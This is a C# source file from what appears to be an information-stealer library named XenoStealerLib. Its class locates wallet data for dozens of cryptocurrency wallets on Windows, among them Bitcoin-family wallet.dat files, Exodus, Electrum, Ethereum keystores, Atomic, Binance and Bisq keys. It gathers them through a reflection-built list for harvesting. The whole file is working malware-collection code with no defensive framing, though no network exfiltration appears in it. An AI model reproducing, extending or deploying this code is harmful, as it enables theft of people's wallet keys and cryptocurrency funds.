using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealerLib
{
    public static class Crypto_applications
    {
        //Coinomi, Dash, Litecoin, Bitcoin, Dogecoin, Qtum, Armory, Bytecoin, MultiBit, Jaxx Liberty, Exodus, Ethereum, Electrum, Electrum-LTC, Atomic Wallet, Guarda, WalletWasabi
        private static string localAppdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private static string roamingAppdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        private static string _programFiles = null;
        private static string programFiles
        {
            get
            {
                if (_programFiles != null)
                {
                    return _programFiles;
                }
                string programFiles64Bit = Environment.GetEnvironmentVariable("ProgramW6432");
                if (programFiles64Bit == null || programFiles64Bit == "")
                {
                    programFiles64Bit = "NonExistant";
                }
                _programFiles = programFiles64Bit;
                return _programFiles;
            }
        }
        private static readonly string programFilesX86 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86);


        private static string GetRegistryPatternWallet64(string name)
        {
            try
            {
                using (RegistryKey CurrentUser64 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64))
                {
                    using (RegistryKey software = CurrentUser64.OpenSubKey("Software"))
                    {
                        using (RegistryKey NameReg = software.OpenSubKey(name))
                        {
                            using (RegistryKey NameRegQT = NameReg.OpenSubKey(name + "-Qt"))
                            {
                                string DataDir = NameRegQT.GetValue("strDataDir").ToString();
                                if (Directory.Exists(DataDir))
                                {
                                    return DataDir;
                                }

                            }
                        }
                    }
                }
            }
            catch { }
            return null;
        }
        private static string GetRegistryPatternWallet32(string name)
        {
            try
            {
                using (RegistryKey CurrentUser32 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32))
                {
                    using (RegistryKey software = CurrentUser32.OpenSubKey("Software"))
                    {
                        using (RegistryKey NameReg = software.OpenSubKey(name))
                        {
                            using (RegistryKey NameRegQT = NameReg.OpenSubKey(name + "-Qt"))
                            {
                                string DataDir = NameRegQT.GetValue("strDataDir").ToString();
                                if (Directory.Exists(DataDir))
                                {
                                    return DataDir;
                                }

                            }
                        }
                    }
                }
            }
            catch { }
            return null;
        }

        private static string GetRegistryPatternWallet(string name) 
        {
            string result = GetRegistryPatternWallet64(name);
            if (result != null) 
            {
                return result;
            }
            return GetRegistryPatternWallet32(name);
        }

        public static FunctionInfo[] GetFunctions() 
        { 
            List<FunctionInfo> functionInfos = new List<FunctionInfo>();
            foreach (object objfunc in MethodBase.GetCurrentMethod().DeclaringType.GetMembers())
            {
                MethodInfo MethodFunc= objfunc as MethodInfo;
                if (MethodFunc==null) 
                {
                    continue;
                }
                
                string name = MethodFunc.Name;
                if (name.EndsWith("_file"))
                {
                    name = name.Substring(0, name.Length - "_file".Length).Replace("_", " ");
                    Func<string> func = () => (string)MethodFunc.Invoke(null, new object[] { });
                    functionInfos.Add(new FunctionInfo(true, false, name, func));
                }
                else if (name.EndsWith("_directory"))
                {
                    name = name.Substring(0, name.Length - "_directory".Length).Replace("_", " ");
                    Func<string> func = () => (string)MethodFunc.Invoke(null, new object[] { });
                    functionInfos.Add(new FunctionInfo(false, true, name, func));
                }
            }
            return functionInfos.ToArray();
        }

        public static string DashCore_file() //file
        {
            string DashCoreWalletPath = GetRegistryPatternWallet("Dash");
            if (DashCoreWalletPath != null) 
            { 
                return Path.Combine(DashCoreWalletPath, "wallet.dat");
            }
            return null;
        }

        public static string Litecoin_file() //file
        {
            string LitecoinWalletPath = GetRegistryPatternWallet("Litecoin");
            if (LitecoinWalletPath != null)
            {
                return Path.Combine(LitecoinWalletPath, "wallet.dat");
            }
            return null;
        }

        public static string Bitcoin_file() //file
        {
            string BitcoinWalletPath = GetRegistryPatternWallet("Bitcoin");
            if (BitcoinWalletPath != null)
            {
                return Path.Combine(BitcoinWalletPath, "wallet.dat");
            }
            return null;
        }

        public static string DogeCoin_file() //file
        {
            string DogeCoinWalletPath = GetRegistryPatternWallet("Dogecoin");
            if (DogeCoinWalletPath != null)
            {
                return Path.Combine(DogeCoinWalletPath, "wallet.dat");
            }
            return null;
        }

        public static string Qtum_file() //file
        {
            string QtumWalletPath = GetRegistryPatternWallet("Qtum");
            if (QtumWalletPath != null)
            {
                return Path.Combine(QtumWalletPath, "wallet.dat");
            }
            return null;
        }

        public static string Coinomi_directory() //directory
        {
            string local_Coinomi = Path.Combine(localAppdata, "Coinomi", "Coinomi", "wallets");
            string roaming_Coinomi = Path.Combine(roamingAppdata, "Coinomi", "Coinomi", "wallets");
            if (Directory.Exists(local_Coinomi))
            {
                return local_Coinomi;
            }
            else if (Directory.Exists(roaming_Coinomi))
            {
                return roaming_Coinomi;
            }
            return null;
        }

        public static string Armory_directory() //directory
        {
            string Armory = Path.Combine(roamingAppdata, "Armory");
            if (Directory.Exists(Armory)) 
            {
                return Armory;
            }
            return null;
        }

        public static string Bytecoin_directory() //directory
        {
            string Bytecoin = Path.Combine(roamingAppdata, "bytecoin");
            if (Directory.Exists(Bytecoin))
            {
                return Bytecoin;
            }
            return null;
        }

        public static string MultiBit_directory() //directory
        {
            string MultiBit = Path.Combine(roamingAppdata, "MultiBit");
            if (Directory.Exists(MultiBit))
            {
                return MultiBit;
            }
            return null;
        }

        // im not adding jaxx liberty as its discontinued (according to their site)

        public static string Exodus_directory() //directory
        {
            string Exodus = Path.Combine(roamingAppdata, "Exodus", "exodus.wallet");
            if (Directory.Exists(Exodus))
            {
                return Exodus;
            }
            return null;
        }

        public static string Ethereum_directory() //directory
        {
            string Ethereum = Path.Combine(roamingAppdata, "Ethereum", "keystore");
            if (Directory.Exists(Ethereum))
            {
                return Ethereum;
            }
            return null;
        }

        public static string Electrum_directory() //directory
        {
            string ElectrumWallet = Path.Combine(roamingAppdata, "Electrum", "wallets");
            if (Directory.Exists(ElectrumWallet))
            {
                return ElectrumWallet;
            }
            return null;
        }

        public static string Electrum_config_file() //file
        {
            string ElectrumConfig = Path.Combine(roamingAppdata, "Electrum", "config");
            if (File.Exists(ElectrumConfig))
            {
                return ElectrumConfig;
            }
            return null;
        }

        public static string ElectrumLTC_directory() //directory
        {
            string ElectrumLTCWallet = Path.Combine(roamingAppdata, "Electrum-LTC", "wallets");
            if (Directory.Exists(ElectrumLTCWallet))
            {
                return ElectrumLTCWallet;
            }
            return null;
        }

        public static string ElectrumLTC_config_file() //file
        {
            string ElectrumLTCConfig = Path.Combine(roamingAppdata, "Electrum-LTC", "config");
            if (File.Exists(ElectrumLTCConfig))
            {
                return ElectrumLTCConfig;
            }
            return null;
        }

        public static string AtomicWallet_directory() //directory
        {
            string AtomicWallet = Path.Combine(roamingAppdata, "atomic", "Local Storage", "leveldb");
            if (Directory.Exists(AtomicWallet))
            {
                return AtomicWallet;
            }
            return null;
        }

        public static string Guarda_directory() //directory
        {
            string Guarda = Path.Combine(roamingAppdata, "Guarda",  "Local Storage", "leveldb");
            if (Directory.Exists(Guarda))
            {
                return Guarda;
            }
            return null;
        }

        public static string WalletWasabi_directory() //directory
        {
            string WalletWasabi = Path.Combine(roamingAppdata, "WalletWasabi", "Client", "Wallets");
            if (Directory.Exists(WalletWasabi))
            {
                return WalletWasabi;
            }
            return null;
        }

        public static string WalletWasabi_config_file() //file
        {
            string WalletWasabi_config = Path.Combine(roamingAppdata, "WalletWasabi", "Client", "Config.json");
            if (File.Exists(WalletWasabi_config))
            {
                return WalletWasabi_config;
            }
            return null;
        }

        //ElectronCash, Sparrow, IOCoin, PPCoin, BBQCoin, Mincoin, DevCoin, YACoin, Franko

        public static string ElectronCash_directory() //dictionary
        {
            string ElectronCash = Path.Combine(roamingAppdata, "ElectronCash", "wallets");
            if (Directory.Exists(ElectronCash))
            {
                return ElectronCash;
            }
            return null;
        }

        public static string ElectronCash_config_file() //file
        {
            string ElectronCash_config = Path.Combine(roamingAppdata, "ElectronCash", "config");
            if (File.Exists(ElectronCash_config))
            {
                return ElectronCash_config;
            }
            return null;
        }

        public static string Sparrow_directory() //dictionary
        {
            string Sparrow = Path.Combine(roamingAppdata, "Sparrow", "wallets");
            if (Directory.Exists(Sparrow))
            {
                return Sparrow;
            }
            return null;
        }

        public static string Sparrow_config_file() //file
        {
            string Sparrow = Path.Combine(roamingAppdata, "Sparrow", "config");
            if (File.Exists(Sparrow))
            {
                return Sparrow;
            }
            return null;
        }

        public static string IOCoin_directory() //dictionary
        {
            string IOCoin = Path.Combine(roamingAppdata, "IOCoin");
            if (Directory.Exists(IOCoin))
            {
                return IOCoin;
            }
            return null;
        }

        public static string PPCoin_directory() //dictionary
        {
            string PPCoin = Path.Combine(roamingAppdata, "PPCoin");
            if (Directory.Exists(PPCoin))
            {
                return PPCoin;
            }
            return null;
        }

        public static string BBQCoin_directory() //dictionary
        {
            string BBQCoin = Path.Combine(roamingAppdata, "BBQCoin");
            if (Directory.Exists(BBQCoin))
            {
                return BBQCoin;
            }
            return null;
        }

        public static string Mincoin_directory() //directory
        {
            string local_Mincoin = Path.Combine(localAppdata, "Mincoin");
            string roaming_Mincoin = Path.Combine(roamingAppdata, "Mincoin");
            if (Directory.Exists(local_Mincoin))
            {
                return local_Mincoin;
            }
            else if (Directory.Exists(roaming_Mincoin))
            {
                return roaming_Mincoin;
            }
            return null;
        }
        public static string DevCoin_directory() //directory
        {
            string DevCoin = Path.Combine(roamingAppdata, "devcoin");
            if (Directory.Exists(DevCoin))
            {
                return DevCoin;
            }
            return null;
        }
        public static string YACoin_directory() //directory
        {
            string YACoin = Path.Combine(roamingAppdata, "YACoin");
            if (Directory.Exists(YACoin))
            {
                return YACoin;
            }
            return null;
        }

        public static string Franko_directory() //directory
        {
            string local_Franko = Path.Combine(localAppdata, "Franko");
            string roaming_Franko = Path.Combine(roamingAppdata, "Franko");
            if (Directory.Exists(local_Franko))
            {
                return local_Franko;
            }
            else if (Directory.Exists(roaming_Franko))
            {
                return roaming_Franko;
            }
            return null;
        }

        //FreiCoin, InfiniteCoin, GoldCoinGLD, Binance, Terracoin, Daedalus Mainnet, MyMonero, MyCrypto, AtomicDEX, Bisq, Defichain-Electrum, TokenPocket (Browser), Zap, simpleos, Etherwall

        public static string FreiCoin_directory() //directory
        {
            string local_FreiCoin = Path.Combine(localAppdata, "FreiCoin");
            string roaming_FreiCoin = Path.Combine(roamingAppdata, "FreiCoin");
            if (Directory.Exists(local_FreiCoin))
            {
                return local_FreiCoin;
            }
            else if (Directory.Exists(roaming_FreiCoin))
            {
                return roaming_FreiCoin;
            }
            return null;
        }

        public static string InfiniteCoin_directory() //directory
        {
            string local_Infinitecoin = Path.Combine(localAppdata, "Infinitecoin");
            string roaming_Infinitecoin = Path.Combine(roamingAppdata, "Infinitecoin");
            if (Directory.Exists(local_Infinitecoin))
            {
                return local_Infinitecoin;
            }
            else if (Directory.Exists(roaming_Infinitecoin))
            {
                return roaming_Infinitecoin;
            }
            return null;
        }

        public static string GoldCoinGLD_directory() //directory
        {
            string local_GoldCoinGLD = Path.Combine(localAppdata, "GoldCoinGLD");
            string roaming_GoldCoinGLD = Path.Combine(roamingAppdata, "GoldCoinGLD");
            string local_GoldCoin_GLD = Path.Combine(localAppdata, "GoldCoin (GLD)");
            string roaming_GoldCoin_GLD = Path.Combine(roamingAppdata, "GoldCoin (GLD)");
            if (Directory.Exists(local_GoldCoinGLD))
            {
                return local_GoldCoinGLD;
            }
            else if (Directory.Exists(roaming_GoldCoinGLD))
            {
                return roaming_GoldCoinGLD;
            }
            else if (Directory.Exists(local_GoldCoin_GLD))
            {
                return local_GoldCoin_GLD;
            }
            else if (Directory.Exists(roaming_GoldCoin_GLD))
            {
                return roaming_GoldCoin_GLD;
            }
            return null;
        }

        public static string Binance_directory() //directory
        {
            string Binance = Path.Combine(roamingAppdata, "Binance", "Local Storage", "leveldb");
            if (Directory.Exists(Binance))
            {
                return Binance;
            }
            return null;
        }

        public static string Binance_wallet_directory() //directory
        {
            string Binance_wallet = Path.Combine(roamingAppdata, "Binance", "wallets");
            if (Directory.Exists(Binance_wallet))
            {
                return Binance_wallet;
            }
            return null;
        }

        public static string Binance_wallet_config_file() //file
        {
            string Binance_wallet_config = Path.Combine(roamingAppdata, "Binance", "config");
            if (File.Exists(Binance_wallet_config))
            {
                return Binance_wallet_config;
            }
            return null;
        }

        //Terracoin, Daedalus Mainnet, MyMonero, MyCrypto, AtomicDEX, Bisq

        public static string Terracoin_directory() 
        {
            string local_Terracoin = Path.Combine(localAppdata, "Terracoin");
            string roaming_Terracoin = Path.Combine(roamingAppdata, "Terracoin");
            if (Directory.Exists(local_Terracoin))
            {
                return local_Terracoin;
            }
            else if (Directory.Exists(roaming_Terracoin))
            {
                return roaming_Terracoin;
            }
            return null;
        }

        public static string DaedalusMainnet_directory() //directory
        {
            string DaedalusMainnet = Path.Combine(roamingAppdata, "Daedalus Mainnet");
            if (Directory.Exists(DaedalusMainnet))
            {
                return DaedalusMainnet;
            }
            return null;
        }

        public static string MyMonero_directory() //directory
        {
            string MyMonero = Path.Combine(roamingAppdata, "MyMonero", "Local Storage", "leveldb");
            if (Directory.Exists(MyMonero))
            {
                return MyMonero;
            }
            return null;
        }

        public static string MyCrypto_directory() //directory
        {
            string MyCrypto = Path.Combine(roamingAppdata, "MyCrypto", "Local Storage", "leveldb");
            if (Directory.Exists(MyCrypto))
            {
                return MyCrypto;
            }
            return null;
        }

        public static string AtomicDEX_file() //file
        {
            string AtomicDEX = Path.Combine(roamingAppdata, "atomic_qt", "config");
            if (File.Exists(AtomicDEX))
            {
                return AtomicDEX;
            }
            return null;
        }

        public static string Bisq_directory() //directory
        {
            string Bisq = Path.Combine(roamingAppdata, "Bisq", "btc_mainnet", "wallet");
            if (Directory.Exists(Bisq))
            {
                return Bisq;
            }
            return null;
        }

        public static string Bisq_db_directory() //directory
        {
            string Bisq_db = Path.Combine(roamingAppdata, "Bisq", "btc_mainnet", "db");
            if (Directory.Exists(Bisq_db))
            {
                return Bisq_db;
            }
            return null;
        }

        public static string Bisq_keys_directory() //directory
        {
            string Bisq_keys = Path.Combine(roamingAppdata, "Bisq", "btc_mainnet", "keys");
            if (Directory.Exists(Bisq_keys))
            {
                return Bisq_keys;
            }
            return null;
        }

        //Zap, simpleos, Neon, Etherwall, bitmonero

        public static string Zap_directory() //directory
        {
            string Zap = Path.Combine(roamingAppdata, "Zap", "Local Storage", "leveldb");
            if (Directory.Exists(Zap))
            {
                return Zap;
            }
            return null;
        }

        public static string Simpleos_directory() //directory
        {
            string simpleos = Path.Combine(roamingAppdata, "simpleos", "Local Storage", "leveldb");
            if (Directory.Exists(simpleos))
            {
                return simpleos;
            }
            return null;
        }

        public static string Neon_directory() //directory
        {
            string Neon = Path.Combine(roamingAppdata, "Neon", "storage");
            if (Directory.Exists(Neon))
            {
                return Neon;
            }
            return null;
        }

        public static string Etherwall_directory() //directory
        {
            string DataDir = null;
            foreach (RegistryView view in new RegistryView[] { RegistryView.Registry64, RegistryView.Registry32 })
            {
                try
                {
                    using (RegistryKey CurrentUserX = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, view))
                    {
                        using (RegistryKey software = CurrentUserX.OpenSubKey("Software"))
                        {
                            using (RegistryKey EtherdyneReg = software.OpenSubKey("Etherdyne"))
                            {
                                using (RegistryKey EtherwallReg = EtherdyneReg.OpenSubKey("Etherwall"))
                                {
                                    using (RegistryKey gethReg = EtherwallReg.OpenSubKey("geth"))
                                    {
                                        DataDir = gethReg.GetValue("datadir").ToString();
                                        break;
                                    }

                                }
                            }
                        }
                    }

                }
                catch
                {
                }
            }
            if (DataDir == null)
            {
                return null;
            }
            string Etherwall = Path.Combine(DataDir, "keystore");
            if (Directory.Exists(Etherwall)) 
            {
                return Etherwall;
            }
            return null;
        }

        public static string bitmonero_directory() //directory
        {
            string bitmonero = Path.Combine(programFiles, "bitmonero", "lmdb");
            string bitmonerox86 = Path.Combine(programFilesX86, "bitmonero", "lmdb");

            if (Directory.Exists(bitmonero))
            {
                return bitmonero;
            }
            else if (Directory.Exists(bitmonerox86)) 
            {
                return bitmonerox86;
            }

            return null;
        }

        public class FunctionInfo 
        {
            public bool isDirectory;
            public bool isFile;
            public string name;
            private Func<string> Function;
            public FunctionInfo(bool isFile, bool isDirectory, string name, Func<string> func) 
            { 
                this.isFile = isFile;
                this.isDirectory = isDirectory;
                this.name = name;
                this.Function = func;
            }
            public Tuple<bool, string> Call() 
            { 
                string returnData= Function.Invoke();
                return new Tuple<bool, string>(!string.IsNullOrWhiteSpace(returnData), returnData);
            }
        }

    }
}
